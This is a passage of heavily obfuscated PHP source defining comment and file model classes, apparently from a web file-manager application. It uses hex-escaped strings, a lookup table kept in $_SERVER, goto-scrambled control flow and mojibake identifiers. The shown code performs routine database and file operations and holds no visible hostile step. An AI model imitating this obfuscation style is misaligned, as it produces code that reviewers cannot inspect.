trim($c‰éëñ™Äî, $cË¿Ã¿â°[377]) . $cË¿Ã¿â°[377]; } return $c‰éëñ™Äî; } } goto FÙ©İ—È¶‚; A™¥†›ß­‘: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\x6d\x65" => "\143\x6f\x6d\155\x65\156\164\x5f\155\x65\164\x61", "\155\145\x74\141\x46\x69\145\154\144" => "\x63\157\x6d\x6d\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($BÜ£ßÅé¦“) { $A‡ìÌƒá· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($BÜ£ßÅé¦“[$A‡ìÌƒá·[1666]]) { $bƒöÈİˆÉ· = $this->where(array($A‡ìÌƒá·[1667] => $BÜ£ßÅé¦“[$A‡ìÌƒá·[1666]]))->find(); if (!$bƒöÈİˆÉ· || $bƒöÈİˆÉ·[$A‡ìÌƒá·[389]] != $BÜ£ßÅé¦“[$A‡ìÌƒá·[389]] || $bƒöÈİˆÉ·[$A‡ìÌƒá·[474]] != $BÜ£ßÅé¦“[$A‡ìÌƒá·[474]]) { return !1; } $this->where(array($A‡ìÌƒá·[1667] => $BÜ£ßÅé¦“[$A‡ìÌƒá·[1666]]))->setAdd($A‡ìÌƒá·[1668], 1); } $BÜ£ßÅé¦“[$A‡ìÌƒá·[1669]] = 0; $BÜ£ßÅé¦“[$A‡ìÌƒá·[1668]] = 0; $BÜ£ßÅé¦“[$A‡ìÌƒá·[683]] = 1; return $this->add($BÜ£ßÅé¦“); } public function commentCount($a¸‘¨Â«Ó, $BõÆœÃ–Šë) { goto Dí–˜ïí˜™; Dí–˜ïí˜™: $A®ÁÍ¼ÅÕÓ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$a¸‘¨Â«Ó) { return array(); } if (is_string($a¸‘¨Â«Ó) || is_int($a¸‘¨Â«Ó)) { $a¸‘¨Â«Ó = array($a¸‘¨Â«Ó); } goto AË“ÓÙ„µ; a÷ò÷¤à²ä: return array_to_keyvalue($B»Ú™Éìá, $A®ÁÍ¼ÅÕÓ[474], $A®ÁÍ¼ÅÕÓ[1671]); goto b•İ£ÙŞ´²; AË“ÓÙ„µ: $aéĞ­ ì¼Ñ = $A®ÁÍ¼ÅÕÓ[1670]; $Bò îš¬™ó = array($A®ÁÍ¼ÅÕÓ[474] => array($A®ÁÍ¼ÅÕÓ[7], $a¸‘¨Â«Ó), $A®ÁÍ¼ÅÕÓ[389] => $BõÆœÃ–Šë); $B»Ú™Éìá = $this->field($aéĞ­ ì¼Ñ)->where($Bò îš¬™ó)->group($A®ÁÍ¼ÅÕÓ[474])->select(); goto a÷ò÷¤à²ä; b•İ£ÙŞ´²: } public function remove($eÊ¶×†Øˆ) { $C½Ôí°ÔƒŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A­ØôéæÎ = array($C½Ôí°ÔƒŒ[1667] => $eÊ¶×†Øˆ); $d´“¥åÈ±… = $this->where($A­ØôéæÎ)->find(); if ($d´“¥åÈ±…[$C½Ôí°ÔƒŒ[1666]]) { $this->where(array($C½Ôí°ÔƒŒ[1667] => $d´“¥åÈ±…[$C½Ôí°ÔƒŒ[1666]]))->setAdd($C½Ôí°ÔƒŒ[1668], -1); } return $this->where($A­ØôéæÎ)->delete(); } public function edit($eÒÀÈíÒ‡, $E‚ ğ¦ºò) { $AäÖ š¤®Ú =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÂîÀÕÖ‹ = array($AäÖ š¤®Ú[1667] => $eÒÀÈíÒ‡); return $this->where($bÂîÀÕÖ‹)->save(array($AäÖ š¤®Ú[1672] => $E‚ ğ¦ºò)); } public function prasise($aƒ“ÔÀ°´¼) { $Fì¥‘Ğç¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d…ğ¶É´†Õ = Model($Fì¥‘Ğç¡[1673]); $EˆÑÖÓ…øº = array($Fì¥‘Ğç¡[1667] => $aƒ“ÔÀ°´¼, $Fì¥‘Ğç¡[1471] => USER_ID); $CÕ¸¼“Ä = $d…ğ¶É´†Õ->where($EˆÑÖÓ…øº)->find(); if (!$CÕ¸¼“Ä) { $d…ğ¶É´†Õ->add($EˆÑÖÓ…øº); $EÄÚˆ³Š³‚ = $this->where(array($Fì¥‘Ğç¡[1667] => $aƒ“ÔÀ°´¼))->setAdd($Fì¥‘Ğç¡[1669], 1); } else { $d…ğ¶É´†Õ->where($EˆÑÖÓ…øº)->delete(); $EÄÚˆ³Š³‚ = $this->where(array($Fì¥‘Ğç¡[1667] => $aƒ“ÔÀ°´¼))->setAdd($Fì¥‘Ğç¡[1669], -1); } return $EÄÚˆ³Š³‚; } public function targetInfo($e˜©ƒ…óÛİ, $fçÇ‰‘ÜÉ¯) { goto bÒ­¦„¦‡; cªæ˜…¦”†: return $DÆİÑÌàäÀ; goto fç¢æŞÅ¿ó; c•’ôôâ•×: $Aö÷ƒ‹¬İ« = "\122\111\x47\110\x54\x20\x4a\117\111\116\40{$this->tablePrefix}\143\157\x6d\x6d\x65\156\x74\137\x70\162\x61\151\x73\x65\40\x73\x74\x61\x72\40\x6f\x6e\40\x63\157\x6d\x6d\x65\x6e\x74\x2e\x63\157\155\x6d\x65\156\x74\x49\x44\x20\75\x20\163\164\x61\x72\56\x63\x6f\x6d\155\x65\156\x74\x49\104"; $cÅ¥Ñùğä® = $this->alias($E¤çä½ç[350])->where($då‡›¾ßùå)->join($Aö÷ƒ‹¬İ«, $E¤çä½ç[1674])->count(); $DÆİÑÌàäÀ = array($E¤çä½ç[1675] => $F†ìĞéæ“Ğ, $E¤çä½ç[1676] => $cÅ¥Ñùğä®); goto cªæ˜…¦”†; bÒ­¦„¦‡: $E¤çä½ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $då‡›¾ßùå = array($E¤çä½ç[538] => $e˜©ƒ…óÛİ, $E¤çä½ç[539] => $fçÇ‰‘ÜÉ¯); $F†ìĞéæ“Ğ = $this->where($då‡›¾ßùå)->count(); goto c•’ôôâ•×; fç¢æŞÅ¿ó: } public function listData($D‡¬ÌË»ë) { $fÅ…ŸƒïŞ² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1677]])) { if ($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1677]]) { $D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1678]] = array($fÅ…ŸƒïŞ²[923], intval($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1677]])); } unset($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1677]]); } if (isset($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1679]])) { if ($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1679]]) { $D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1678]] = array($fÅ…ŸƒïŞ²[920], intval($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1679]])); } unset($D‡¬ÌË»ë[$fÅ…ŸƒïŞ²[1679]]); } return $this->_listData($D‡¬ÌË»ë); } private function _listData($Dôï¡÷ÁßÓ) { $d¼Ã·Œ×½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eö‚Éö‘Á¨ = $this->where($Dôï¡÷ÁßÓ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Eö‚Éö‘Á¨[$d¼Ã·Œ×½[363]]); $this->_listAppendUser($Eö‚Éö‘Á¨[$d¼Ã·Œ×½[363]]); $this->_listAppendMeta($Eö‚Éö‘Á¨[$d¼Ã·Œ×½[363]]); return $Eö‚Éö‘Á¨; } private function _makeOrder() { $DİÕ«ï—³ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BŒ™İ òÍŞ = array($DİÕ«ï—³[1669], $DİÕ«ï—³[1668], $DİÕ«ï—³[192]); $Eßóº…îÛ = Input::get($DİÕ«ï—³[424], $DİÕ«ï—³[7], $DİÕ«ï—³[407], $BŒ™İ òÍŞ); $B¨‘ÌÕÀ = Input::get($DİÕ«ï—³[425], $DİÕ«ï—³[7], $DİÕ«ï—³[1473], array($DİÕ«ï—³[1680], $DİÕ«ï—³[422])); $f¯Œê¿ñÕ‰ = $Eßóº…îÛ . $DİÕ«ï—³[50] . $B¨‘ÌÕÀ; return $this->order($f¯Œê¿ñÕ‰); } private function _listAppendParent(&$cé·ù¬²ø²) { goto Fá†³¾»‹†; DŸĞô¡é˜¢: foreach ($cé·ù¬²ø² as &$fá‡°‚ ) { if (isset($e”‚×—¨Ú»[$fá‡°‚ [$B÷åùŸ¶Ç[1666]]])) { $fá‡°‚ [$B÷åùŸ¶Ç[1681]] = $e”‚×—¨Ú»[$fá‡°‚ [$B÷åùŸ¶Ç[1666]]]; } } unset($fá‡°‚ ); goto c­ØÊ¬ÔÛ; Fá†³¾»‹†: $B÷åùŸ¶Ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cìŠó¹Àª = array_unique(array_to_keyvalue($cé·ù¬²ø², $B÷åùŸ¶Ç[33], $B÷åùŸ¶Ç[1666])); $cìŠó¹Àª = array_remove_value($cìŠó¹Àª, $B÷åùŸ¶Ç[486]); goto Fß©‚Èæ†Ñ; Fß©‚Èæ†Ñ: if (!$cìŠó¹Àª) { return; } $e”‚×—¨Ú» = $this->where(array($B÷åùŸ¶Ç[1667] => array($B÷åùŸ¶Ç[7], $cìŠó¹Àª)))->select(); $e”‚×—¨Ú» = array_to_keyvalue($e”‚×—¨Ú», $B÷åùŸ¶Ç[1678]); goto DŸĞô¡é˜¢; c­ØÊ¬ÔÛ: } private function _listAppendUser(&$DÈ–’²ãáÀ) { goto bÉè©×ï¢Ú; E÷‹ƒ¤»‚†: if (count($eêù§íˆ•º) == 0) { return; } foreach ($DÈ–’²ãáÀ as $EšĞ¿ğ‡¥Œ) { if (isset($EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[1681]])) { $eêù§íˆ•º[] = $EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[1681]][$b‹·ŒÎíó[1479]]; } } $F¨“ùÂãƒ§ = Model($b‹·ŒÎíó[495])->userListInfo($eêù§íˆ•º); goto cã×Šù¾ƒ; bÉè©×ï¢Ú: $b‹·ŒÎíó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eêù§íˆ•º = array_unique(array_to_keyvalue($DÈ–’²ãáÀ, $b‹·ŒÎíó[33], $b‹·ŒÎíó[1479])); $eêù§íˆ•º = array_remove_value($eêù§íˆ•º, $b‹·ŒÎíó[486]); goto E÷‹ƒ¤»‚†; cã×Šù¾ƒ: foreach ($DÈ–’²ãáÀ as &$EšĞ¿ğ‡¥Œ) { $EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[551]] = $F¨“ùÂãƒ§[$EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[1479]]]; if (isset($EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[1681]])) { $EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[1681]][$b‹·ŒÎíó[551]] = $F¨“ùÂãƒ§[$EšĞ¿ğ‡¥Œ[$b‹·ŒÎíó[1681]][$b‹·ŒÎíó[1479]]]; } } unset($EšĞ¿ğ‡¥Œ); goto A¥¶ˆ³™‹¬; A¥¶ˆ³™‹¬: } private function _listAppendMeta(&$bÆ¬¹ì²’) { goto dŒÊ†—†ç¿; dŒÊ†—†ç¿: $A£Š¶´ÖØÄ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÁğÍô‰èä = array_unique(array_to_keyvalue($bÆ¬¹ì²’, $A£Š¶´ÖØÄ[33], $A£Š¶´ÖØÄ[1678])); $cÁğÍô‰èä = array_remove_value($cÁğÍô‰èä, $A£Š¶´ÖØÄ[486]); goto D§š÷§¢; fåé…×÷Í: if (!$c­ÇÌ¶Ë½ù) { return !1; } foreach ($bÆ¬¹ì²’ as &$Dã¹ùË¥½–) { $Dã¹ùË¥½–[$A£Š¶´ÖØÄ[434]] = $c­ÇÌ¶Ë½ù[$Dã¹ùË¥½–[$A£Š¶´ÖØÄ[1678]]]; if (isset($Dã¹ùË¥½–[$A£Š¶´ÖØÄ[1681]])) { $Dã¹ùË¥½–[$A£Š¶´ÖØÄ[1681]][$A£Š¶´ÖØÄ[434]] = $c­ÇÌ¶Ë½ù[$Dã¹ùË¥½–[$A£Š¶´ÖØÄ[1681]][$A£Š¶´ÖØÄ[1678]]]; } } unset($Dã¹ùË¥½–); goto Cö•™Ÿù¨; D§š÷§¢: if (!$cÁğÍô‰èä) { return; } foreach ($bÆ¬¹ì²’ as $Dã¹ùË¥½–) { if (isset($Dã¹ùË¥½–[$A£Š¶´ÖØÄ[1681]])) { $cÁğÍô‰èä[] = $Dã¹ùË¥½–[$A£Š¶´ÖØÄ[1681]][$A£Š¶´ÖØÄ[1678]]; } } $c­ÇÌ¶Ë½ù = $this->metaList($cÁğÍô‰èä); goto fåé…×÷Í; Cö•™Ÿù¨: } private function metaList($Dº†ˆÄ³ã”) { goto b‘ÒŠ˜•œ; b‘ÒŠ˜•œ: $E·ˆµØÛ‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Dº†ˆÄ³ã”) { return array(); } $C¡ÈŞ—àã– = array($E·ˆµØÛ‚[1678] => array($E·ˆµØÛ‚[7], $Dº†ˆÄ³ã”)); goto c•‚â–¹ƒµ; Eãº—Îç‡ö: return $aĞ×ªÉ¹ÀŒ ? $aĞ×ªÉ¹ÀŒ : array(); goto Dˆ…ˆ®˜éä; c•‚â–¹ƒµ: $aĞ×ªÉ¹ÀŒ = Model($E·ˆµØÛ‚[1682])->where($C¡ÈŞ—àã–)->select(); $aĞ×ªÉ¹ÀŒ = array_to_keyvalue_group($aĞ×ªÉ¹ÀŒ, $E·ˆµØÛ‚[1678]); foreach ($aĞ×ªÉ¹ÀŒ as $Fß‡ï£ìäé => $fÌÓõ·§Äç) { $dº—äŒƒ¡Œ = array(); foreach ($fÌÓõ·§Äç as $aĞ‘ìîÜç) { $dº—äŒƒ¡Œ[$aĞ‘ìîÜç[$E·ˆµØÛ‚[92]]] = $aĞ‘ìîÜç[$E·ˆµØÛ‚[368]]; } $aĞ×ªÉ¹ÀŒ[$Fß‡ï£ìäé] = $dº—äŒƒ¡Œ; } goto Eãº—Îç‡ö; Dˆ…ˆ®˜éä: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\145" => "\151\157\x5f\x66\151\154\145\137\x6d\x65\x74\141", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\x66\151\x6c\145\x49\104"); public function fileInfo($E¢Â–í£×) { $C¨‚Şêæ‹„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $eğœ‚§ƒÓğ = array(); if (!isset($eğœ‚§ƒÓğ[$E¢Â–í£×])) { $c—ë¤Äï = $C¨‚Şêæ‹„[1683]; $aØ…ã’óõã = Model($C¨‚Şêæ‹„[439])->field($c—ë¤Äï)->where(array($C¨‚Şêæ‹„[437] => $E¢Â–í£×))->find(); $eğœ‚§ƒÓğ[$E¢Â–í£×] = $aØ…ã’óõã; } return $eğœ‚§ƒÓğ[$E¢Â–í£×]; } public function addFileByContent($C¤ÎÙí©‹ = '', $EĞ³³»¶™õ = '') { goto eÄÚ…†‡®‹; Bª‘Œ•ˆ³ì: $cÚ³ÈĞÈÃ« = $f¾‘ïŞ£áİ . $cè¦ÂŠí˜ô[1685] . rand_string(16); file_put_contents($cÚ³ÈĞÈÃ«, $C¤ÎÙí©‹); $AÍÖÛÛ”ø = $this->addFile($cÚ³ÈĞÈÃ«, $EĞ³³»¶™õ, !0); goto f²õ¨îÛ¹Ô; eÄÚ…†‡®‹: $cè¦ÂŠí˜ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f¾‘ïŞ£áİ = TEMP_PATH . $cè¦ÂŠí˜ô[1684]; if (!is_dir($f¾‘ïŞ£áİ)) { mk_dir($f¾‘ïŞ£áİ); } goto Bª‘Œ•ˆ³ì; f²õ¨îÛ¹Ô: if (file_exists($cÚ³ÈĞÈÃ«)) { @unlink($cÚ³ÈĞÈÃ«); } return $AÍÖÛÛ”ø; goto DƒÖàëÂİ; DƒÖàëÂİ: } public function createFileName($Fíé½åïæ‚) { goto Bî×øŸ‰ŒÚ; Bî×øŸ‰ŒÚ: $f›ß‡‚åïù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÍèŠøÀƒ = IO::init($f›ß‡‚åïù[8]); $AÏï†Ê¦­² = $this->makeFilePath($Fíé½åïæ‚, $FÍèŠøÀƒ); goto EÑ‡°çÇˆ‰; EÂÚñ‡½»: if (!$E‚Œ»·™âé && !Cache::get($C—¼äáğŠî)) { $E‚Œ»·™âé = !0; $bÃŒöÜ = IO::mkdir($AìªÈÇ³À); if (!IO::exist($bÃŒöÜ . $f›ß‡‚åïù[1687])) { IO::mkfile($bÃŒöÜ . $f›ß‡‚åïù[1687]); } Cache::set($C—¼äáğŠî, 1, 3600 * 2); } return $AÏï†Ê¦­²; goto d­ô‡¼••ò; EÑ‡°çÇˆ‰: $AìªÈÇ³À = $FÍèŠøÀƒ->pathFather($AÏï†Ê¦­²); static $E‚Œ»·™âé = false; $C—¼äáğŠî = $f›ß‡‚åïù[1686] . md5($AìªÈÇ³À); goto EÂÚñ‡½»; d­ô‡¼••ò: } public function makeFilePath($B‹š…¿õÒİ, $bÛËŞ·Ùñİ) { goto D’’Ëî; D’’Ëî: $eÚöõÃáÂ¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b˜‘¬×¢£á = Model($eÚöõÃáÂ¡[1075])->get($eÚöõÃáÂ¡[1688]); $Dî…´½‚© = KodIO::defaultIO() . date($eÚöõÃáÂ¡[1689]); goto fÜ˜‰‡åß„; d‚ÙÍäóŸÀ: switch ($b˜‘¬×¢£á) { case $eÚöõÃáÂ¡[1691]: $Aš™ÍØšÑ‹ = $Aš™ÍØšÑ‹ . $eÚöõÃáÂ¡[94] . $bÛËŞ·Ùñİ->ext($B‹š…¿õÒİ); if ($bÛËŞ·Ùñİ->ext($B‹š…¿õÒİ) == $eÚöõÃáÂ¡[1628]) { $Aš™ÍØšÑ‹ .= $eÚöõÃáÂ¡[1380]; } break; case $eÚöõÃáÂ¡[1692]: goto e‹ÁË¤¥£; A—«÷Ñƒ…†: if (IO::isTypeObject($Aš™ÍØšÑ‹) && !IO::isUploadServer($Aš™ÍØšÑ‹)) { $B½ù³²©Ÿó = IO::setContent($Aš™ÍØšÑ‹, $eÚöõÃáÂ¡[33]); if (!$B½ù³²©Ÿó) { show_json($eÚöõÃáÂ¡[1697], !1); } } CacheLock::unlock($C•¥Ú¹¢è„); break; goto cÇÖ¡‡Š; B³áÆ¢ÏŒÚ: $Dî…´½‚© = $eÚöõÃáÂ¡[1073] . $a•‰˜´ ‚[$eÚöõÃáÂ¡[385]] . $eÚöõÃáÂ¡[1694] . date($eÚöõÃáÂ¡[1695]) . $e±ÏØã½ƒˆ . $eÚöõÃáÂ¡[8]; if ($bÛËŞ·Ùñİ->ext($B‹š…¿õÒİ) == $eÚöõÃáÂ¡[1628]) { $B‹š…¿õÒİ .= $eÚöõÃáÂ¡[1380]; } $C•¥Ú¹¢è„ = $eÚöõÃáÂ¡[1696] . $Dî…´½‚© . $B‹š…¿õÒİ; goto A‘ªäĞŞ‡‚; A‘ªäĞŞ‡‚: CacheLock::lock($C•¥Ú¹¢è„); $f­¯îº§š = IO::fileNameAuto($Dî…´½‚©, $B‹š…¿õÒİ); $Aš™ÍØšÑ‹ = $Dî…´½‚© . $f­¯îº§š; goto A—«÷Ñƒ…†; e‹ÁË¤¥£: $Aáä•ÜË§ğ = Model($eÚöõÃáÂ¡[1075])->get($eÚöõÃáÂ¡[1376]); $e±ÏØã½ƒˆ = substr(md5($eÚöõÃáÂ¡[1693] . $Aáä•ÜË§ğ . date($eÚöõÃáÂ¡[681])), 0, 8); $a•‰˜´ ‚ = KodIO::defaultDriver(); goto B³áÆ¢ÏŒÚ; cÇÖ¡‡Š: case $eÚöõÃáÂ¡[1690]: break; default: break; } return $Aš™ÍØšÑ‹; goto eó¬±õô‚; fÜ˜‰‡åß„: $Aš™ÍØšÑ‹ = $Dî…´½‚© . rand_string(5) . short_id(100); $B‹š…¿õÒİ = str_replace($eÚöõÃáÂ¡[8], $eÚöõÃáÂ¡[70], KodIO::clear($B‹š…¿õÒİ)); if (!$B‹š…¿õÒİ) { $b˜‘¬×¢£á = $eÚöõÃáÂ¡[1690]; } goto d‚ÙÍäóŸÀ; eó¬±õô‚: } public function addFileByRemote($Aß©ª­Û×Ù, $Dª¯íŠõƒİ, $BÛ¹ˆ—ì£® = array()) { goto a²…™›£õ†; Aàİ£òÜ±: $c¾¶“Ö–Õ‹ = IO::hashMd5($Aß©ª­Û×Ù, $F‹ÍÙ¬Ç×¿); $EôÌÁÚ¥…ê = KodIO::defaultDriver(); $aîğ…¶Æ¨ = array($B¶¬ºô‹¼í[537] => IO::size($Aß©ª­Û×Ù), $B¶¬ºô‹¼í[1698] => 1, $B¶¬ºô‹¼í[404] => $Dª¯íŠõƒİ, $B¶¬ºô‹¼í[729] => $EôÌÁÚ¥…ê[$B¶¬ºô‹¼í[385]], $B¶¬ºô‹¼í[405] => $Aß©ª­Û×Ù, $B¶¬ºô‹¼í[1699] => $BÛ¹ˆ—ì£®[$B¶¬ºô‹¼í[170]] ? $BÛ¹ˆ—ì£®[$B¶¬ºô‹¼í[170]] : IO::hashSimple($Aß©ª­Û×Ù), $B¶¬ºô‹¼í[1700] => $c¾¶“Ö–Õ‹ ? $c¾¶“Ö–Õ‹ : $F‹ÍÙ¬Ç×¿); goto DÛ¼ÂêÕ÷·; DÛ¼ÂêÕ÷·: if ($a¯¡Ç»øÉ± = $this->addFileCheckExist($aîğ…¶Æ¨[$B¶¬ºô‹¼í[170]], $aîğ…¶Æ¨[$B¶¬ºô‹¼í[169]], $aîğ…¶Æ¨[$B¶¬ºô‹¼í[77]])) { return $a¯¡Ç»øÉ±; } return $this->addFileData($aîğ…¶Æ¨); goto DéšÂÑÒŠ±; a²…™›£õ†: $B¶¬ºô‹¼í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!IO::exist($Aß©ª­Û×Ù)) { return !1; } $F‹ÍÙ¬Ç×¿ = $BÛ¹ˆ—ì£®[$B¶¬ºô‹¼í[169]] ? $BÛ¹ˆ—ì£®[$B¶¬ºô‹¼í[169]] : $B¶¬ºô‹¼í[33]; goto Aàİ£òÜ±; DéšÂÑÒŠ±: } private function addFileData($b¢õ¤†¥¶„) { $dÓ…‡™æ‘Ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$b¢õ¤†¥¶„) { return !1; } $b¢õ¤†¥¶„[$dÓ…‡™æ‘Ö[77]] = intval($b¢õ¤†¥¶„[$dÓ…‡™æ‘Ö[77]]); if (!$b¢õ¤†¥¶„[$dÓ…‡™æ‘Ö[77]] && strlen($b¢õ¤†¥¶„[$dÓ…‡™æ‘Ö[170]]) > 32) { $b¢õ¤†¥¶„[$dÓ…‡™æ‘Ö[77]] = intval(substr($b¢õ¤†¥¶„[$dÓ…‡™æ‘Ö[170]], 32)); } $Bµ„×áõô = $this->add($b¢õ¤†¥¶„); return $this->find($Bµ„×áõô); } public function addFile($EåÊ¿­ Ûà, $f›¸Š£÷ÉÜ, $bëò„²œì = false) { goto f¸‚ï‡Šè; BºÑ“÷‚ç¢: $aç‡è¥²Ãƒ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1701] . $BßÔÃµ¹å; CacheLock::lock($aç‡è¥²Ãƒ); if ($BˆäˆÉĞ„» = $this->addFileCheckExist($A‡‚¬¶©ÓË, $BßÔÃµ¹å, $DÀ¶ˆºÖ‹™)) { CacheLock::unlock($aç‡è¥²Ãƒ); return $BˆäˆÉĞ„»; } goto AÕğ–´Õì¬; fÀæï“•Üõ: return $e•Ù¼¦; goto FìÉîÉÅˆ; f¸‚ï‡Šè: $A‡‚¬¶©ÓË = IO::hashSimple($EåÊ¿­ Ûà); $BßÔÃµ¹å = IO::hashMd5($EåÊ¿­ Ûà); $DÀ¶ˆºÖ‹™ = IO::size($EåÊ¿­ Ûà); goto BºÑ“÷‚ç¢; AÕğ–´Õì¬: $d¤¤ÈÙ·‘„ = $this->addFileMake($EåÊ¿­ Ûà, $DÀ¶ˆºÖ‹™, $A‡‚¬¶©ÓË, $BßÔÃµ¹å, $f›¸Š£÷ÉÜ, $bëò„²œì); $e•Ù¼¦ = $this->addFileData($d¤¤ÈÙ·‘„); CacheLock::unlock($aç‡è¥²Ãƒ); goto fÀæï“•Üõ; FìÉîÉÅˆ: } public function addFileMake($E² š ‚šˆ, $AÓéÜŠä±Í, $B­ª¬­ëÕ, $AÂºø™ãÅ, $EØ¯â‚Øá, $f‘·ÈğÚ) { goto a•ÓòÆ¢®²; BÒ½ŒÍ†’: $a©ÌÄß§ˆ£ = KodIO::defaultDriver(); $A¯ ô¯Ì– = array($AÍõ‡½†Ü[537] => $AÓéÜŠä±Í, $AÍõ‡½†Ü[1698] => 1, $AÍõ‡½†Ü[404] => $EØ¯â‚Øá, $AÍõ‡½†Ü[729] => $a©ÌÄß§ˆ£[$AÍõ‡½†Ü[385]], $AÍõ‡½†Ü[405] => $a°õİöš, $AÍõ‡½†Ü[1699] => $B­ª¬­ëÕ, $AÍõ‡½†Ü[1700] => $AÂºø™ãÅ); return $A¯ ô¯Ì–; goto cÖùÎˆ›Œ; a•ÓòÆ¢®²: $AÍõ‡½†Ü =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a°õİöš = $this->createFileName($EØ¯â‚Øá); $b¢ÑšĞèÍÅ = get_path_father($a°õİöš); goto bó½ÈéÄ¤; bó½ÈéÄ¤: $c˜¤±è¬¿é = get_path_this($a°õİöš); if ($f‘·ÈğÚ) { $EõÂ¹Çòİâ = IO::move($E² š ‚šˆ, $b¢ÑšĞèÍÅ, !1, $c˜¤±è¬¿é); } else { $EõÂ¹Çòİâ = IO::copy($E² š ‚šˆ, $b¢ÑšĞèÍÅ, !1, $c˜¤±è¬¿é); } if (!$EõÂ¹Çòİâ) { return !1; } goto BÒ½ŒÍ†’; cÖùÎˆ›Œ: } public function addFileCheckExist($a±ÆŒÄÇ™, $b¬»›·µŠ¦, $bíğÁ¼åÚ) { $Fñã…§è‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eŒÂÌ±Ë… = $this->findByHash($a±ÆŒÄÇ™, $b¬»›·µŠ¦); if (!$eŒÂÌ±Ë…) { return !1; } $aëÌìÑÜî¸ = array($Fñã…§è‡[1698] => intval($eŒÂÌ±Ë…[$Fñã…§è‡[1702]]) + 1, $Fñã…§è‡[537] => $bíğÁ¼åÚ); $this->where(array($Fñã…§è‡[437] => $eŒÂÌ±Ë…[$Fñã…§è‡[436]]))->save($aëÌìÑÜî¸); return $eŒÂÌ±Ë…; } public function remove($fÌÚª«‚çƒ) { $this->linkCountChange($fÌÚª«‚çƒ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Dë‚îñÑõå) { $this->linkCountChange($Dë‚îñÑõå, !0); } public function linkCountChange($f—òÛÕÕÂ¹, $c’Àè¤ÈÅ) { goto E¦Œİ‚¨—´; AĞôêÈ’ºÊ: foreach ($E÷é¸ÛÍ  as $d»®¥ó»… => $AÈõº•ˆà) { $e½®½Â’—š = $AÈõº•ˆà . $aÄˆ¯¤Î‰[33]; if (!$Cº›º¯à–Í[$e½®½Â’—š]) { $Cº›º¯à–Í[$e½®½Â’—š] = array(); } $Cº›º¯à–Í[$e½®½Â’—š][] = $d»®¥ó»…; } foreach ($Cº›º¯à–Í as $AÈõº•ˆà => $DğÃóçæÏ›) { if (!$DğÃóçæÏ›) { continue; } $AÈõº•ˆà = $c’Àè¤ÈÅ ? $AÈõº•ˆà : -intval($AÈõº•ˆà); $f¾¿ÁÎœ = array($aÄˆ¯¤Î‰[436] => array($aÄˆ¯¤Î‰[7], $DğÃóçæÏ›)); if ($AÈõº•ˆà < 0) { $f¾¿ÁÎœ[$aÄˆ¯¤Î‰[1702]] = array($aÄˆ¯¤Î‰[924], abs($AÈõº•ˆà)); } $this->where($f¾¿ÁÎœ)->setAdd($aÄˆ¯¤Î‰[1702], $AÈõº•ˆà); } goto FÉÆÑÁšøÒ; E¦Œİ‚¨—´: $aÄˆ¯¤Î‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$f—òÛÕÕÂ¹) { return; } if (!is_array($f—òÛÕÕÂ¹)) { $f—òÛÕÕÂ¹ = array($f—òÛÕÕÂ¹); } goto eÑÚ‰¡Á¤è; eÑÚ‰¡Á¤è: $E÷é¸ÛÍ  = array(); foreach ($f—òÛÕÕÂ¹ as $d»®¥ó»…) { $e½®½Â’—š = $d»®¥ó»… . $aÄˆ¯¤Î‰[33]; if (!$E÷é¸ÛÍ [$e½®½Â’—š]) { $E÷é¸ÛÍ [$e½®½Â’—š] = 0; } $E÷é¸ÛÍ [$e½®½Â’—š]++; } $Cº›º¯à–Í = array(); goto AĞôêÈ’ºÊ; FÉÆÑÁšøÒ: } public function findByHash($e²÷¿áµâ‹, $BÀÑÓáß²¿ = false) { 